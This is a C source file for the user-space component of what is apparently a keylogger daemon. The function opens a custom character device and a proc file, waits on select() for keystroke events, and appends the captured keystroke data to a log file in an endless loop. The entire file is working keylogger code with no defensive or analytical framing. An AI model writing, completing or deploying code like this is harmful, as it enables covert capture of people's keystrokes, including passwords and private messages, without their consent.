#include <stdio.h>
#include <fcntl.h>
#include "key_logger.h"
#include "kdae_handler.h"
#include "config.h"
#include "kdae_fd.h"

#define BUFSIZE 16

extern int fd_arr[ALL_FD_SIZE];

void key_logger(void)
{
	int fd_max, str_len, result;
	char message[BUFSIZE];
	struct timeval timeout;
	fd_set reads, temps;

	fd_arr[DEV] = open(CHAR_DEV, O_RDWR|O_NOCTTY);
	if(fd_arr[DEV]<0)
		error_handler(CHAR_DEV " file open error\n");

	fd_arr[PROC] = open(PROC_FILE, O_RDONLY);
	if(fd_arr[PROC]<0)
		error_handler(PROC_FILE " file open error\n");

	fd_arr[KEYLOG] = open(KEY_LOG_FILE, O_WRONLY|O_CREAT|O_APPEND, 0644);
	if(fd_arr[KEYLOG]<0)
		error_handler(KEY_LOG_FILE " open error\n");

	FD_ZERO(&reads);
	FD_SET(fd_arr[DEV], &reads);
	while(1)
	{
		temps = reads;
		result = select(fd_arr[PROC]+1, &temps, NULL, NULL, NULL);
		if(result==-1)
			error_handler("select() error\n");

		if(result==0)
		{
#ifdef DEBUG_MODE
			printf("result : %d\n", result);
#endif
		}
		else
		{
			if(FD_ISSET(fd_arr[DEV], &temps))
			{
				str_len = read(fd_arr[PROC], message, BUFSIZE);
				write(fd_arr[KEYLOG], message, str_len);
				lseek(fd_arr[PROC], 0, SEEK_SET);
			}
		}
	}
}
